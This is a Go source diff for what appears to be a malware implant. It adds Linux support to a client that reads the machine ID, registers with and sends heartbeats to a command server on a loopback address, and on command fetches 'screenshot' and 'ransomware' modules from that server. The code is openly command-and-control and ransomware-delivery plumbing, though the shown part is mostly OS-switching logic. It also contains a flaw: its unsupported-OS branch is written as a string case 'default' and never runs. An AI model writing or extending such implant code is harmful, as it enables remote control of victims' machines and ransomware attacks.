@@ -9,7 +9,6 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
-
 	//"io"
 	"io/ioutil"
 	"log"
@@ -51,6 +50,15 @@ func getmachineid() string {
 		if err != nil {
 			log.Fatal(err)
 		}
+	} else if opersys == "linux" {
+		data, err := ioutil.ReadFile("/etc/machine-id")
+		if err != nil {
+			panic(err)
+		}
+		id = string(data)
+	} else {
+		fmt.Println("unsupported OS")
+		os.Exit(1)
 	}
 	return id
 }
@@ -68,7 +76,19 @@ func register() {
 
 	postBody, _ := json.Marshal(b)
 
-	resp, err := http.Post("http://localhost:8081/register", "application/json", bytes.NewBuffer(postBody))
+	var resp *http.Response
+	var err error
+
+	switch opersys {
+	case "windows":
+		resp, err = http.Post("http://localhost:8081/register", "application/json", bytes.NewBuffer(postBody))
+	case "linux":
+		resp, err = http.Post("http://127.0.1.1:8081/register", "application/json", bytes.NewBuffer(postBody))
+	case "default":
+		fmt.Println("OS unsupported")
+		os.Exit(1)
+	}
+
 	//Handle Error
 	if err != nil {
 		fmt.Printf("An Error Occured %v\n", err)
@@ -90,8 +110,18 @@ func heartbeat() {
 	}
 
 	postBody, _ := json.Marshal(b)
+	var resp *http.Response
+	var err error
+	switch opersys {
+	case "windows":
+		resp, err = http.Post("http://localhost:8081/heartbeat", "application/json", bytes.NewBuffer(postBody))
+	case "linux":
+		resp, err = http.Post("http://127.0.1.1:8081/heartbeat", "application/json", bytes.NewBuffer(postBody))
+	case "default":
+		fmt.Println("OS unsupported")
+		os.Exit(1)
+	}
 
-	resp, err := http.Post("http://localhost:8081/heartbeat", "application/json", bytes.NewBuffer(postBody))
 	//Handle Error
 	if err != nil {
 		fmt.Printf("An Error Occured %v\n", err)
@@ -113,9 +143,18 @@ func heartbeat() {
 
 func execmod(cmdrsp string) {
 	fmt.Printf("received %s module\n", cmdrsp)
-
+	var resp *http.Response
+	var err error
 	if cmdrsp == "screenshot" {
-		resp, err := http.Get("http://localhost:8081/screen")
+		switch opersys {
+		case "windows":
+			resp, err = http.Get("http://localhost:8081/screen")
+		case "linux":
+			resp, err = http.Get("http://127.0.1.1:8081/screen")
+		case "default":
+			fmt.Println("OS unsupported")
+			os.Exit(1)
+		}
 		if err != nil {
 			log.Fatalf("An Error Occured %v", err)
 		}
@@ -149,7 +188,15 @@ func execmod(cmdrsp string) {
 
 		option := strs[len(strs)-1]
 
-		resp, err := http.Get("http://localhost:8081/ransomware")
+		switch opersys {
+		case "windows":
+			resp, err = http.Get("http://localhost:8081/ransomware")
+		case "linux":
+			resp, err = http.Get("http://127.0.1.1:8081/ransomware")
+		case "default":
+			fmt.Println("OS unsupported")
+			os.Exit(1)
+		}
 		if err != nil {
 			log.Fatalf("An Error Occured %v", err)
 		}
